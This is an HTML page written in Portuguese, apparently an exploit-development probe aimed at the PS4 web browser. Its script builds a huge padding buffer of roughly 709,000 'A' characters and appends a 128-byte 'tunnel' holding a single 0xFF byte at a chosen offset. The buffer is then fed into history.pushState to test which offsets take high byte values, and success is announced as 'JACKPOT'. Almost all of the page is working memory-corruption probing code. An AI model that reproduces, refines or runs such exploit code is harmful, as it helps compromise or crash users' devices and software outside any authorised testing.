<!DOCTYPE html>
<html>
<head>
    <title>PS4 Blind Spot Sonar</title>
    <style>
        body { background-color: #001a00; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 18px; padding: 15px; margin: 5px; cursor: pointer; 
            width: 45%; border: 1px solid #00ff00; background: #111; color: #fff;
        }
        #log { margin-top: 20px; border: 1px solid #444; padding: 15px; color: cyan; background: #000; }
        .grid { display: flex; flex-wrap: wrap; justify-content: center; }
    </style>
</head>
<body>

    <h1>SONAR: Onde posso escrever 0xFF?</h1>
    <p>Procurando um byte que aceite valores altos dentro do túnel.</p>

    <div id="log">Escolha um offset...</div>

    <div class="grid">
        <button onclick="pingSonar(8)">Offset +8</button>
        <button onclick="pingSonar(16)">Offset +16</button>
        <button onclick="pingSonar(24)">Offset +24</button>
        <button onclick="pingSonar(32)">Offset +32</button>
        <button onclick="pingSonar(40)">Offset +40</button>
        <button onclick="pingSonar(48)">Offset +48</button>
        <button onclick="pingSonar(56)">Offset +56</button>
        <button onclick="pingSonar(64)">Offset +64</button>
        <button onclick="pingSonar(72)">Offset +72</button>
        <button onclick="pingSonar(80)">Offset +80</button>
    </div>

    <script>
        const OFFSET = 709522;
        const TUNNEL_SIZE = 128; // Já sabemos que isso é seguro

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function pingSonar(targetIndex) {
            log("Testando Offset +" + targetIndex + " com valor 0xFF...");
            
            setTimeout(() => {
                try {
                    // 1. Cria o Buffer Seguro Base
                    let buffer = "A".repeat(OFFSET);
                    
                    // 2. Cria o Túnel de 128 bytes (Array de caracteres)
                    // Preenchemos tudo com 0x01 (Seguro)
                    let tunnel = new Array(TUNNEL_SIZE).fill('\x01');
                    
                    // 3. A MINA: Coloca 0xFF apenas no local escolhido
                    // \xFF é o valor mais alto possível (255)
                    tunnel[targetIndex] = '\xFF'; 

                    // Junta tudo
                    buffer += tunnel.join('');

                    // Dispara
                    history.pushState({}, "sonar_" + targetIndex, "/" + buffer);
                    
                    // SE CHEGAR AQUI, É UM MILAGRE (JACKPOT)
                    log("!!! JACKPOT !!! Offset +" + targetIndex + " ACEITOU 0xFF!");
                    document.body.style.backgroundColor = "#ffffff"; 
                    document.body.style.color = "#000000";

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
